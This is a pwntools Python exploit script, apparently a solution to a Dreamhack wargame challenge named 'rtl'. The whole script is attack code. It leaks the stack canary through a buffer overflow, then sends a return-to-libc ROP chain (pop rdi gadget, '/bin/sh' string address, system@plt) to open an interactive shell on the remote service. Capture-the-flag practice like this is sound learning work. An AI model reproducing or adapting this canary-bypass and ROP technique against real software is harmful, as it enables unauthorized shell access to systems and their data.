from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

p = remote("host1.dreamhack.games", 17853)
# p = process("./rtl")

# [1] Get information about buf
buf2sfp = 0x30+0x8+0x8
buf2cnry = buf2sfp - 8

slog("buf <=> sfp", buf2sfp)
slog("buf <=> canary", buf2cnry)

# cnry = b""
payload = b"A"*(buf2cnry+1)

p.recvuntil(b"Buf: ")
p.send(payload) #sendline is have \n

p.recvuntil(payload)
tmp=p.recvn(7)
cnry = u64(b"\x00"+tmp)

slog("Canary", cnry)

# [3] Exploit
pop_rdi = int("0x0000000000400853", 16)
binsh= int("0x400874", 16)
system_plt = int("0x4005d0", 16)
justret = int("0x0000000000400285", 16)

payload = b"A"*buf2cnry
payload += p64(cnry)
payload += b"B"*0x8
payload += p64(justret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

p.sendlineafter(b"Buf: ", payload)
p.interactive()